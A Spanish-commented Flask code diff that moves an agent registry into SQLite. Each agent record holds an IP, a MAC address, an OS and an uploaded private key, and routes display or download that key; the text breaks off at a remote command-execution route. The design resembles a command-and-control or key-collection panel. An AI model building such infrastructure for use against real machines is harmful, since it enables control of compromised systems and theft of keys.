@@ -1,53 +1,75 @@
-from flask import Flask, render_template, request, jsonify, send_file, Response
+from flask import Flask, render_template, request, jsonify, send_file
 from io import BytesIO
-import socket, threading, subprocess
-import time 
+import socket, threading
+from database.database import init_db, get_db_connection
 
 app = Flask(__name__)
 
+init_db()  # Inicializar la base de datos al iniciar la app
 agents = []
-next_id = 1 
 connected_agents = {}  # Diccionario para almacenar las conexiones de agentes activas
 
 @app.route('/') # Ruta principal 
 def index():
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute('SELECT id, ip, mac, so FROM agents')
+    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3]} for row in c.fetchall()]
+    conn.close()
+    
     return render_template('index.html', agents=agents)
 
-@app.route('/register_agent', methods=['POST']) # Registro de agentes 
+@app.route('/register_agent', methods=['POST'])  
 def register_agent():
-    global next_id
     ip = request.form.get('ip')
     mac = request.form.get('mac')
     so = request.form.get('so')
     private_key_file = request.files.get('private_key')
+
     if not ip or not mac or not so or not private_key_file:
         return jsonify({'error': 'Faltan IP, MAC o clave privada'}), 400
-    private_key_content = private_key_file.read()
-    agent = {
-        'id': next_id,
-        'ip': ip,
-        'mac': mac,
-        'so': so,
-        'private_key': private_key_content.decode('utf-8') 
-    }
-    agents.append(agent)
-    next_id += 1
-    return jsonify({'message': 'Agente registrado con éxito', 'agent_id': agent['id']}), 200
 
-@app.route('/view_private_key/<int:agent_id>', methods=['GET']) # Visualizar clave privada 
+    private_key_content = private_key_file.read().decode('utf-8')
+
+    # Guardar agente en la base de datos
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute('''INSERT INTO agents (ip, mac, so, private_key) 
+                 VALUES (?, ?, ?, ?)''', (ip, mac, so, private_key_content))
+    agent_id = c.lastrowid  # Recuperar el ID generado automáticamente
+    conn.commit()
+    conn.close()
+    # Devolver el agent_id en formato JSON
+    return jsonify({'message': 'Agente registrado con éxito', 'agent_id': agent_id}), 200
+
+
+@app.route('/view_private_key/<int:agent_id>', methods=['GET'])  # Visualizar clave privada
 def view_private_key(agent_id):
-    agent = next((a for a in agents if a['id'] == agent_id), None)
-    if not agent:
-        return jsonify({'error': 'Agente no encontrado'}), 404
-    return render_template('view_key.html', private_key=agent['private_key'])
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute('SELECT private_key FROM agents WHERE id = ?', (agent_id,))
+    agent = c.fetchone()
+    conn.close()
 
-@app.route('/download_private_key/<int:agent_id>', methods=['GET']) # Descargar la clave privada 
-def download_private_key(agent_id):
-    agent = next((a for a in agents if a['id'] == agent_id), None)
     if not agent:
         return jsonify({'error': 'Agente no encontrado'}), 404
-    private_key_io = BytesIO(agent['private_key'].encode('utf-8'))
+    
+    return render_template('view_key.html', private_key=agent[0])
+
+@app.route('/download_private_key/<int:agent_id>', methods=['GET'])  # Descargar la clave privada
+def download_private_key(agent_id):
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute('SELECT private_key FROM agents WHERE id = ?', (agent_id,))
+    agent = c.fetchone()
+    conn.close()
+    
+    if not agent:
+        return jsonify({'error': 'Agente no encontrado'}), 404
+    
+    private_key_io = BytesIO(agent[0].encode('utf-8'))
     return send_file(private_key_io, as_attachment=True, download_name="rsa_private.pem", mimetype='application/x-pem-file')
+
 
 @app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
 def execute_command(agent_id):
